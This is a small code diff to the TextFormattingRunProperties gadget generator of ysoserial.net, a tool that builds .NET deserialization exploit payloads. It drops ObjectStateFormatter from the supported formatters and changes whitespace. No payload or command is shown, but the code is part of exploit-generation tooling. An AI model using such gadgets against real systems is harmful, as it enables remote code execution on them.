@@ -20,7 +20,7 @@ namespace ysoserial.Generators
         {
             Type typeTFRP = typeof(TextFormattingRunProperties);
             info.SetType(typeTFRP);
-            info.AddValue("ForegroundBrush", _xaml);
+            info.AddValue("ForegroundBrush", _xaml);            
         }
         public TextFormattingRunPropertiesMarshal(string xaml)
         {
@@ -61,7 +61,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer" };
+            return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer" };
         }
 
         public override OptionSet Options()
@@ -143,7 +143,6 @@ namespace ysoserial.Generators
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
             {
                 return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
@@ -253,5 +252,5 @@ namespace ysoserial.Generators
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
             return payload;
         }
-    }
+    } 
 }
